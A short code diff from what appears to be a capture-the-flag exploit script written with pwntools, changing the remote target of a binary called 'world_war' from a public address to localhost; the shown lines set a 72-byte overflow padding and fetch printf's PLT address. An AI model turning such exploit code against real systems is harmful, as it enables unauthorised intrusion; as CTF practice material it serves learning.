@@ -2,7 +2,7 @@ from pwn import *
 
 def exploit():
     binary = ELF("./world_war")
-    p = remote("180.250.7.183", 51137)
+    p = remote("127.0.0.1", 8888)
     
     padding = 72
     printf_plt = p32(binary.symbols["plt.printf"])
